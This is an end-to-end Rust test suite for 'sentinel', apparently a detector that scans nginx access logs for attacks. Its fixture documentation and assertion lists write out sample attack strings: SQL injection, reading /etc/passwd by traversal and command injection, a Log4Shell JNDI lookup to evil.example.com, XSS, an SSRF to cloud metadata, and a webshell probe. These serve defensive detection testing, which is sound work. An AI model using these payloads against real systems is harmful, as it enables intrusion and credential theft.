//! End-to-end tests for the compiled `sentinel` binary.
//!
//! Every test spawns `env!("CARGO_BIN_EXE_sentinel")`, so these cover argument
//! parsing, the banner, the interactive prompt, the parallel scan, every
//! detection family that has a fixture, the dashboard renderer and the process
//! exit codes. No test reaches into the crate's internals.
//!
//! # Fixture contract
//!
//! `tests/fixtures/attack_mix.log` — exactly 120 non-empty lines:
//!
//! | lines   | contents                                                        |
//! |---------|-----------------------------------------------------------------|
//! | 1-30    | benign browser / API traffic                                    |
//! | 31      | stock `common` format (no referer or user-agent)                |
//! | 32      | vhost-prefixed `combined` line                                  |
//! | 33      | IPv6 source address                                             |
//! | 34      | flat JSON access-log line                                       |
//! | 35      | SQL injection (`/product?id=1%27%20OR%20%271%27=%271`, 200)     |
//! | 36      | path traversal (`/../../etc/passwd`, 404)                       |
//! | 37      | LFI (`/download?file=/etc/passwd`, 200)                         |
//! | 38      | command injection (`?host=...%3Bcat%20/etc/passwd`, 403)        |
//! | 39      | Log4Shell JNDI payload in the User-Agent                        |
//! | 40      | XSS (`%3Cscript%3E...`, 200)                                    |
//! | 41      | SSRF to the EC2 metadata endpoint, 200                          |
//! | 42      | webshell probe (`/uploads/shell.php?cmd=whoami`, 200)           |
//! | 43      | sensitive file probe (`/.env`, 404)                             |
//! | 44      | Nikto scanner User-Agent                                        |
//! | 45-72   | brute force: 28 x `POST /login` 401 within 27 s                 |
//! | 73-117  | enumeration: 45 distinct `/probe/*` 404s within 88 s            |
//! | 118-120 | malformed lines (garbage, corrupt record, unterminated quote)   |
//!
//! Exact totals asserted: 120 scanned lines, 3 malformed lines, 28 login
//! failures and 45 distinct enumeration paths. Event totals are deliberately
//! *not* asserted exactly: several rules can fire on one line, so the engine's
//! event count is allowed to grow as rules are added.
//!
//! `benign.log` — exactly 60 clean lines, zero expected events (false-positive
//! guard). `malformed.log` — 3 garbage lines. `empty.log` — zero bytes.

use std::collections::HashSet;
use std::io::Write;
use std::path::{Path, PathBuf};
use std::process::{Command, Output, Stdio};
use std::time::{SystemTime, UNIX_EPOCH};

const BIN: &str = env!("CARGO_BIN_EXE_sentinel");

const ATTACK_MIX_LINES: u64 = 120;
const ATTACK_MIX_MALFORMED: u64 = 3;
const ATTACK_MIX_BRUTE_FORCES: usize = 28;
const ATTACK_MIX_SCAN_PATHS: usize = 45;
const BENIGN_LINES: u64 = 60;
const MALFORMED_LINES: u64 = 3;

fn fixture(name: &str) -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .join("tests")
        .join("fixtures")
        .join(name)
}

/// Build an argv vector: optional log path followed by flags.
fn argv(path: Option<&Path>, extra: &[&str]) -> Vec<String> {
    let mut args = Vec::with_capacity(extra.len() + 1);
    if let Some(path) = path {
        args.push(path.to_string_lossy().into_owned());
    }
    args.extend(extra.iter().map(|arg| (*arg).to_string()));
    args
}

/// Spawn the binary with a closed stdin (or a pipe carrying `stdin`).
fn run(args: &[String], stdin: Option<&str>) -> Output {
    let mut command = Command::new(BIN);
    command.args(args);
    command.stdout(Stdio::piped()).stderr(Stdio::piped());
    command.stdin(if stdin.is_some() {
        Stdio::piped()
    } else {
        Stdio::null()
    });

    let mut child = command
        .spawn()
        .unwrap_or_else(|error| panic!("failed to spawn {BIN}: {error}"));

    if let Some(input) = stdin {
        let mut handle = child.stdin.take().expect("stdin was piped");
        handle
            .write_all(input.as_bytes())
            .expect("failed to write to the child's stdin");
    }

    child.wait_with_output().expect("failed to wait for sentinel")
}

fn stdout(output: &Output) -> String {
    String::from_utf8_lossy(&output.stdout).into_owned()
}

fn stderr(output: &Output) -> String {
    String::from_utf8_lossy(&output.stderr).into_owned()
}

fn assert_success(output: &Output, context: &str) {
    assert!(
        output.status.success(),
        "{context}: expected exit 0, got {status:?}\n--- stdout ---\n{out}\n--- stderr ---\n{err}",
        status = output.status.code(),
        out = stdout(output),
        err = stderr(output),
    );
}

fn assert_failure(output: &Output, context: &str) {
    assert!(
        !output.status.success(),
        "{context}: expected a non-zero exit\n--- stdout ---\n{out}\n--- stderr ---\n{err}",
        out = stdout(output),
        err = stderr(output),
    );
}

fn assert_contains(haystack: &str, needle: &str, context: &str) {
    assert!(
        haystack.contains(needle),
        "{context}: missing {needle:?}\n--- output ---\n{haystack}"
    );
}

/// Insert thousands separators exactly like the dashboard does.
fn commafy(value: u64) -> String {
    let digits = value.to_string();
    let mut out = String::with_capacity(digits.len() + digits.len() / 3);
    for (index, ch) in digits.chars().enumerate() {
        if index > 0 && (digits.len() - index) % 3 == 0 {
            out.push(',');
        }
        out.push(ch);
    }
    out
}

/// Extract every digit run from `text`, treating commas as thousands
/// separators. The summary has no comma-separated lists, so this is enough.
fn numbers_in(text: &str) -> Vec<u64> {
    let mut numbers = Vec::new();
    let mut digits = String::new();
    for ch in text.chars() {
        if ch.is_ascii_digit() {
            digits.push(ch);
        } else if ch == ',' && !digits.is_empty() {
            // Thousands separator inside the current number.
        } else if !digits.is_empty() {
            numbers.push(digits.parse().expect("digit run is a valid u64"));
            digits.clear();
        }
    }
    if !digits.is_empty() {
        numbers.push(digits.parse().expect("digit run is a valid u64"));
    }
    numbers
}

/// Numbers rendered on the executive-summary line that starts with `label`.
/// `Lines` returns `[total, malformed]`; `Threats` returns `[events, ips]`.
fn summary_numbers(output: &str, label: &str) -> Vec<u64> {
    let line = output
        .lines()
        .find(|line| line.trim_start().starts_with(label))
        .unwrap_or_else(|| panic!("summary label {label:?} not found in:\n{output}"));
    let rest = &line[line.find(label).expect("label present") + label.len()..];
    numbers_in(rest)
}

fn payload_rows(output: &str) -> usize {
    output.matches('↳').count()
}

fn has_ansi(output: &str) -> bool {
    output.contains('\u{1b}')
}

fn category_breakdown(output: &str) -> String {
    let Some(start) = output.find("CATEGORY BREAKDOWN") else {
        return "<no CATEGORY BREAKDOWN section>".to_string();
    };
    let tail = &output[start..];
    let end = tail.find("TOP THREATS").unwrap_or(tail.len());
    tail[..end].trim_end().to_string()
}

fn assert_all_clear(output: &str, context: &str) {
    assert_contains(output, "No suspicious activity detected.", context);
    assert!(
        !output.contains("TOP THREATS"),
        "{context}: an all-clear report must not render TOP THREATS\n{output}"
    );
    assert!(
        !output.contains("CATEGORY BREAKDOWN"),
        "{context}: an all-clear report must not render CATEGORY BREAKDOWN\n{output}"
    );
}

/// `HH:MM:SS` from an nginx `[dd/Mon/yyyy:HH:MM:SS +zzzz]` field.
fn fixture_clock(line: &str) -> u32 {
    let timestamp = line
        .split('[')
        .nth(1)
        .unwrap_or_else(|| panic!("no '[' timestamp in {line:?}"))
        .split(']')
        .next()
        .expect("closing bracket");
    let clock = timestamp
        .split_whitespace()
        .next()
        .expect("date:time token");
    let mut parts = clock.split(':');
    let _date = parts.next().expect("date part");
    let hours: u32 = parts.next().expect("hours").parse().expect("numeric hours");
    let minutes: u32 = parts
        .next()
        .expect("minutes")
        .parse()
        .expect("numeric minutes");
    let seconds: u32 = parts
        .next()
        .expect("seconds")
        .parse()
        .expect("numeric seconds");
    assert!(hours < 24, "invalid hours in {line:?}");
    assert!(minutes < 60, "invalid minutes in {line:?}");
    assert!(seconds < 60, "invalid seconds in {line:?}");
    hours * 3600 + minutes * 60 + seconds
}

fn non_empty_lines(path: &Path) -> usize {
    std::fs::read_to_string(path)
        .unwrap_or_else(|error| panic!("cannot read {}: {error}", path.display()))
        .lines()
        .filter(|line| !line.trim().is_empty())
        .count()
}

#[test]
fn fixtures_match_documented_shape() {
    assert_eq!(
        non_empty_lines(&fixture("attack_mix.log")),
        ATTACK_MIX_LINES as usize,
        "attack_mix.log line count is part of the test contract"
    );
    assert_eq!(
        non_empty_lines(&fixture("benign.log")),
        BENIGN_LINES as usize,
        "benign.log line count is part of the test contract"
    );
    assert_eq!(
        non_empty_lines(&fixture("malformed.log")),
        MALFORMED_LINES as usize,
        "malformed.log line count is part of the test contract"
    );
    assert_eq!(
        std::fs::metadata(fixture("empty.log"))
            .expect("empty.log exists")
            .len(),
        0,
        "empty.log must be zero bytes"
    );

    let attack = std::fs::read_to_string(fixture("attack_mix.log")).expect("read attack_mix.log");
    assert!(attack.ends_with('\n'), "fixtures must end with a newline");

    // Format variants that the parser must accept, not classify as malformed.
    for marker in [
        "www.example.com 93.184.216.34",
        "2001:db8::1",
        "{\"remote_addr\":\"192.0.2.11\"",
        "192.0.2.10 - - [12/Nov/2026:02:00:50 +0000] \"GET /health HTTP/1.1\" 200 512",
    ] {
        assert!(
            attack.contains(marker),
            "attack_mix.log lost required format marker {marker:?}"
        );
    }

    // One line per attack family keeps the category assertions meaningful.
    for marker in [
        "GET /product?id=1%27%20OR%20%271%27=%271",
        "GET /../../etc/passwd",
        "GET /download?file=/etc/passwd",
        "host=127.0.0.1%3Bcat%20/etc/passwd",
        "${jndi:ldap://evil.example.com/a}",
        "%3Cscript%3Ealert(1)%3C/script%3E",
        "169.254.169.254",
        "shell.php?cmd=whoami",
        "GET /.env",
        "Nikto/2.1.6",
    ] {
        assert!(
            attack.contains(marker),
            "attack_mix.log lost required attack marker {marker:?}"
        );
    }

    let login_failures: Vec<&str> = attack
        .lines()
        .filter(|line| line.contains("POST /login HTTP/1.1\" 401"))
        .collect();
    assert_eq!(
        login_failures.len(),
        ATTACK_MIX_BRUTE_FORCES,
        "brute-force burst line count"
    );
    let first_login = fixture_clock(login_failures.first().expect("login lines"));
    let last_login = fixture_clock(login_failures.last().expect("login lines"));
    assert!(
        last_login - first_login <= 60,
        "brute-force burst must fit in 60s, got {}s",
        last_login - first_login
    );

    let probes: Vec<&str> = attack
        .lines()
        .filter(|line| line.contains("GET /probe/") && line.contains("\" 404 "))
        .collect();
    assert_eq!(probes.len(), ATTACK_MIX_SCAN_PATHS, "scan burst line count");
    let first_probe = fixture_clock(probes.first().expect("probe lines"));
    let last_probe = fixture_clock(probes.last().expect("probe lines"));
    assert!(
        last_probe - first_probe <= 120,
        "enumeration burst must fit in 120s, got {}s",
        last_probe - first_probe
    );

    let distinct_paths: HashSet<&str> = probes
        .iter()
        .map(|line| {
            line.split('"')
                .nth(1)
                .expect("quoted request")
                .split_whitespace()
                .nth(1)
                .expect("request target")
        })
        .collect();
    assert_eq!(
        distinct_paths.len(),
        ATTACK_MIX_SCAN_PATHS,
        "enumeration burst paths must all be distinct"
    );
}

#[test]
fn attack_mix_reports_expected_signals() {
    let path = fixture("attack_mix.log");
    let output = run(&argv(Some(&path), &["--no-color", "--top", "10"]), None);
    assert_success(&output, "attack_mix dashboard run");
    let text = stdout(&output);
    let err = stderr(&output);

    assert!(
        err.trim().is_empty(),
        "a successful non-TTY scan must not write to stderr:\n{err}"
    );

    for header in ["EXECUTIVE SUMMARY", "CATEGORY BREAKDOWN", "TOP THREATS"] {
        assert_contains(&text, header, "attack_mix dashboard");
    }

    assert_eq!(
        summary_numbers(&text, "Lines"),
        vec![ATTACK_MIX_LINES, ATTACK_MIX_MALFORMED],
        "exact scanned/malformed totals"
    );
    assert_contains(
        &text,
        &format!("Lines        {}", commafy(ATTACK_MIX_LINES)),
        "attack_mix dashboard",
    );
    assert_contains(&text, "3 malformed", "attack_mix dashboard");

    let threats = summary_numbers(&text, "Threats");
    assert_eq!(threats.len(), 2, "Threats line has event and IP counts");
    assert!(
        threats[0] >= 10,
        "attack_mix should produce a healthy number of events, got {}",
        threats[0]
    );
    assert!(
        threats[1] >= 2,
        "attack_mix has several offending IPs, got {}",
        threats[1]
    );

    // Categories covered by the fixture. Missing ones indicate a rule or
    // parser regression, not a flaky test.
    for category in [
        "SQL Injection",
        "Path Traversal",
        "Local File Inclusion",
        "Command Injection",
        "Log4Shell",
        "XSS",
        "SSRF",
        "Webshell",
        "Sensitive File Access",
        "Reconnaissance",
        "Brute Force",
    ] {
        assert_contains(&text, category, "category breakdown");
    }

    assert!(
        payload_rows(&text) >= 1,
        "expected at least one payload row:\n{text}"
    );
    assert!(
        !has_ansi(&text),
        "--no-color output must not contain ANSI escapes"
    );
}

#[test]
fn thread_count_does_not_change_summary() {
    let path = fixture("attack_mix.log");
    let single = run(
        &argv(Some(&path), &["--no-color", "--threads", "1", "--top", "10"]),
        None,
    );
    let multi = run(
        &argv(Some(&path), &["--no-color", "--threads", "4", "--top", "10"]),
        None,
    );
    assert_success(&single, "single-threaded scan");
    assert_success(&multi, "four-threaded scan");

    let single_text = stdout(&single);
    let multi_text = stdout(&multi);

    let single_lines = summary_numbers(&single_text, "Lines");
    let multi_lines = summary_numbers(&multi_text, "Lines");
    assert_eq!(
        single_lines, multi_lines,
        "--threads must not change scanned/malformed totals"
    );
    assert_eq!(single_lines, vec![ATTACK_MIX_LINES, ATTACK_MIX_MALFORMED]);

    let single_threats = summary_numbers(&single_text, "Threats");
    let multi_threats = summary_numbers(&multi_text, "Threats");
    assert_eq!(
        single_threats, multi_threats,
        "--threads must not change threat/IP totals"
    );

    assert_eq!(
        category_breakdown(&single_text),
        category_breakdown(&multi_text),
        "--threads must not change category counts"
    );
    assert_eq!(
        payload_rows(&single_text),
        payload_rows(&multi_text),
        "--threads must not change the rendered top list"
    );
}

#[test]
fn multi_chunk_scan_is_deterministic() {
    // The 17 KiB fixture fits inside one read chunk, so the thread test above
    // cannot exercise real parallel workers (the reader has a 1 MiB floor).
    // Repeat it past 2 MiB and force 1 MiB chunks to cover chunk boundaries.
    const COPIES: u64 = 160;
    let fixture_text = std::fs::read_to_string(fixture("attack_mix.log")).expect("read fixture");
    let mut content = String::with_capacity(fixture_text.len() * COPIES as usize);
    for _ in 0..COPIES {
        content.push_str(&fixture_text);
    }

    let stamp = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .expect("clock after epoch")
        .as_nanos();
    let path = std::env::temp_dir().join(format!(
        "sentinel_integration_multichunk_{}_{}.log",
        std::process::id(),
        stamp
    ));
    std::fs::write(&path, &content).expect("write multi-chunk log");

    let single = run(
        &argv(
            Some(&path),
            &["--no-color", "--threads", "1", "--chunk-mb", "1", "--top", "10"],
        ),
        None,
    );
    let multi = run(
        &argv(
            Some(&path),
            &["--no-color", "--threads", "4", "--chunk-mb", "1", "--top", "10"],
        ),
        None,
    );
    let _ = std::fs::remove_file(&path);
    assert_success(&single, "single-threaded multi-chunk scan");
    assert_success(&multi, "multi-threaded multi-chunk scan");

    let single_text = stdout(&single);
    let multi_text = stdout(&multi);
    let expected_lines = ATTACK_MIX_LINES * COPIES;
    let expected_malformed = ATTACK_MIX_MALFORMED * COPIES;

    assert_eq!(
        summary_numbers(&single_text, "Lines"),
        vec![expected_lines, expected_malformed],
        "multi-chunk line accounting"
    );
    assert_contains(
        &single_text,
        &format!("Lines        {}", commafy(expected_lines)),
        "multi-chunk thousands separator",
    );
    assert!(
        summary_numbers(&single_text, "Threats")[0] > 0,
        "multi-chunk scan retained no events"
    );
    assert_eq!(
        summary_numbers(&single_text, "Lines"),
        summary_numbers(&multi_text, "Lines"),
        "chunk boundaries must not change scanned/malformed totals"
    );
    assert_eq!(
        summary_numbers(&single_text, "Threats"),
        summary_numbers(&multi_text, "Threats"),
        "worker count must not change threat/IP totals"
    );
}

#[test]
fn top_flag_limits_payload_rows() {
    let path = fixture("attack_mix.log");
    let output = run(&argv(Some(&path), &["--no-color", "--top", "3"]), None);
    assert_success(&output, "top-three run");
    let text = stdout(&output);

    assert_eq!(
        payload_rows(&text),
        3,
        "--top 3 must render exactly three payload rows:\n{text}"
    );
    assert_contains(&text, "#1", "top list");
    assert_contains(&text, "#2", "top list");
    assert_contains(&text, "#3", "top list");
    assert!(
        !text.contains("#4 "),
        "--top 3 rendered a fourth ranked row:\n{text}"
    );
}

#[test]
fn interactive_prompt_accepts_path() {
    let path = fixture("attack_mix.log");
    let input = format!("{}\n", path.display());
    let output = run(&argv(None, &[]), Some(&input));
    assert_success(&output, "interactive prompt run");
    let text = stdout(&output);

    assert_contains(&text, "nginx access log path", "prompt");
    assert_contains(&text, "EXECUTIVE SUMMARY", "prompted scan");
    assert_eq!(
        summary_numbers(&text, "Lines"),
        vec![ATTACK_MIX_LINES, ATTACK_MIX_MALFORMED],
        "the prompted path must be the file that gets scanned"
    );
    assert!(
        !text.contains("fatal:"),
        "valid prompted path should not produce a fatal error:\n{text}"
    );
}

#[test]
fn help_and_version_flags() {
    let help = run(&argv(None, &["--help"]), None);
    assert_success(&help, "--help");
    let help_text = stdout(&help);
    for needle in [
        "USAGE:",
        "sentinel [LOG_PATH] [OPTIONS]",
        "--threads",
        "--top",
        "--window",
        "--threshold",
        "--chunk-mb",
        "--max-events",
        "--no-color",
    ] {
        assert_contains(&help_text, needle, "--help output");
    }

    let version = run(&argv(None, &["--version"]), None);
    assert_success(&version, "--version");
    assert!(
        stdout(&version)
            .lines()
            .any(|line| line.trim() == "sentinel 0.1.0"),
        "--version must print `sentinel 0.1.0`, got:\n{}",
        stdout(&version)
    );
}

#[test]
fn missing_file_and_directory_are_rejected() {
    let missing = PathBuf::from("/definitely/not/here/sentinel-access.log");
    let output = run(&argv(Some(&missing), &["--no-color"]), None);
    assert_failure(&output, "nonexistent log path");
    let err = stderr(&output);
    assert_contains(&err, "fatal", "nonexistent log path");
    assert_contains(&err, "No such file", "nonexistent log path");

    let directory = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("tests");
    let output = run(&argv(Some(&directory), &["--no-color"]), None);
    assert_failure(&output, "directory log path");
    let err = stderr(&output);
    assert_contains(&err, "fatal", "directory log path");
    assert_contains(&err, "is not a regular file", "directory log path");
    assert_contains(
        &err,
        &directory.to_string_lossy(),
        "directory log path should be named in the error",
    );
}

#[test]
fn empty_log_is_all_clear() {
    let path = fixture("empty.log");
    let output = run(&argv(Some(&path), &["--no-color"]), None);
    assert_success(&output, "empty log");
    let text = stdout(&output);

    assert_eq!(summary_numbers(&text, "Lines"), vec![0, 0]);
    assert_eq!(summary_numbers(&text, "Threats"), vec![0, 0]);
    assert_contains(&text, "0 malformed", "empty log");
    assert_all_clear(&text, "empty log");
}

#[test]
fn malformed_log_is_counted_and_clear() {
    let path = fixture("malformed.log");
    let output = run(&argv(Some(&path), &["--no-color"]), None);
    assert_success(&output, "malformed log");
    let text = stdout(&output);

    assert_eq!(
        summary_numbers(&text, "Lines"),
        vec![MALFORMED_LINES, MALFORMED_LINES]
    );
    assert_eq!(summary_numbers(&text, "Threats"), vec![0, 0]);
    assert_contains(&text, "3 malformed", "malformed log");
    assert_all_clear(&text, "malformed log");
}

#[test]
fn benign_log_has_no_false_positives() {
    let path = fixture("benign.log");
    let output = run(&argv(Some(&path), &["--no-color", "--top", "10"]), None);
    assert_success(&output, "benign log");
    let text = stdout(&output);

    assert_eq!(summary_numbers(&text, "Lines"), vec![BENIGN_LINES, 0]);
    assert_eq!(
        summary_numbers(&text, "Threats"),
        vec![0, 0],
        "benign.log produced suspicious events; categories that fired:\n{}",
        category_breakdown(&text)
    );
    assert_all_clear(&text, "benign log");
}

#[test]
fn max_events_caps_stored_events() {
    let path = fixture("attack_mix.log");
    let output = run(
        &argv(
            Some(&path),
            &["--no-color", "--max-events", "2", "--top", "100"],
        ),
        None,
    );
    assert_success(&output, "max-events run");
    let text = stdout(&output);

    assert_eq!(
        summary_numbers(&text, "Lines"),
        vec![ATTACK_MIX_LINES, ATTACK_MIX_MALFORMED],
        "capping events must not change parsing totals"
    );
    let threats = summary_numbers(&text, "Threats");
    assert!(
        threats[0] < 10,
        "28-rule-event fixture with --max-events 2 stored {} events:\n{text}",
        threats[0]
    );
    assert!(
        !text.contains("Command Injection"),
        "a two-event cap should not retain later attack families:\n{text}"
    );
}

/// The dashboard must report when the event/failure budgets bind.
#[test]
fn max_events_reports_truncation_notice() {
    let path = fixture("attack_mix.log");
    let output = run(
        &argv(Some(&path), &["--no-color", "--max-events", "2"]),
        None,
    );
    assert_success(&output, "max-events truncation run");
    let text = stdout(&output);

    assert_contains(
        &text,
        "Event or auth-failure storage cap reached",
        "truncation notice",
    );
    assert_contains(&text, "--max-events", "truncation notice");
    assert_contains(&text, "for full coverage", "truncation notice");
}

#[test]
fn stateful_burst_detectors_are_reported() {
    let path = fixture("attack_mix.log");
    let output = run(&argv(Some(&path), &["--no-color", "--top", "100"]), None);
    assert_success(&output, "stateful detector run");
    let text = stdout(&output);

    // The brute-force and enumeration events are generated after parsing, so
    // their detail lines prove the stateful passes ran over the fixture.
    assert_contains(&text, "Authentication brute force (BF-001)", "brute force");
    assert_contains(&text, "28 failed logins", "brute force evidence");
    assert_contains(
        &text,
        "Directory and endpoint enumeration (SCAN-001)",
        "enumeration",
    );
    assert_contains(&text, "45 distinct 404/403 path", "enumeration evidence");
    assert!(
        payload_rows(&text) >= ATTACK_MIX_SCAN_PATHS,
        "expected the full enumeration burst in a --top 100 listing, got {} rows:\n{text}",
        payload_rows(&text)
    );
}

#[test]
fn threshold_flag_disables_burst_detection() {
    let path = fixture("attack_mix.log");
    let output = run(
        &argv(Some(&path), &["--no-color", "--threshold", "1000"]),
        None,
    );
    assert_success(&output, "high-threshold run");
    let text = stdout(&output);

    assert!(
        !text.contains("Brute Force"),
        "--threshold 1000 should suppress the 28-login brute-force event:\n{text}"
    );
    assert!(
        !text.contains("Directory and endpoint enumeration"),
        "--threshold 1000 should suppress the 45-path enumeration event:\n{text}"
    );
    // Unrelated path-based detections still run.
    assert_contains(&text, "SQL Injection", "high-threshold run");
    assert_eq!(
        summary_numbers(&text, "Lines"),
        vec![ATTACK_MIX_LINES, ATTACK_MIX_MALFORMED]
    );
}

#[test]
fn invalid_threads_value_is_rejected() {
    let path = fixture("benign.log");
    let output = run(&argv(Some(&path), &["--threads", "0"]), None);
    assert_failure(&output, "--threads 0");
    assert_contains(
        &stderr(&output),
        "--threads must be between 1 and 64",
        "--threads validation",
    );
}

#[test]
fn large_line_count_uses_thousands_separators() {
    const ROWS: u64 = 1_200;
    const CLEAN_LINE: &str = "127.0.0.1 - - [12/Nov/2026:03:00:00 +0000] \"GET /index.html HTTP/1.1\" 200 5819 \"-\" \"Mozilla/5.0 (X11; Linux x86_64)\"\n";

    let mut content = String::with_capacity(CLEAN_LINE.len() * ROWS as usize);
    for _ in 0..ROWS {
        content.push_str(CLEAN_LINE);
    }

    let stamp = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .expect("clock after epoch")
        .as_nanos();
    let path = std::env::temp_dir().join(format!(
        "sentinel_integration_{}_{}.log",
        std::process::id(),
        stamp
    ));
    std::fs::write(&path, content).expect("write generated log");

    let output = run(&argv(Some(&path), &["--no-color"]), None);
    let _ = std::fs::remove_file(&path);
    assert_success(&output, "generated large log");

    let text = stdout(&output);
    assert_eq!(summary_numbers(&text, "Lines"), vec![ROWS, 0]);
    assert_contains(
        &text,
        &format!("Lines        {} scanned", commafy(ROWS)),
        "thousands separator",
    );
    assert_contains(&text, "1,200", "thousands separator");
    assert_all_clear(&text, "generated large log");
}

#[test]
fn piped_output_has_no_ansi() {
    // Colors must disappear when stdout is a pipe even without --no-color.
    if std::env::var_os("CLICOLOR_FORCE").is_some() {
        return;
    }
    let path = fixture("attack_mix.log");
    let output = run(&argv(Some(&path), &["--top", "5"]), None);
    assert_success(&output, "piped color run");
    let text = stdout(&output);
    assert!(
        !has_ansi(&text),
        "piped stdout must not contain ANSI escapes:\n{text}"
    );
    assert!(
        !has_ansi(&stderr(&output)),
        "piped stderr must not contain ANSI escapes"
    );
}
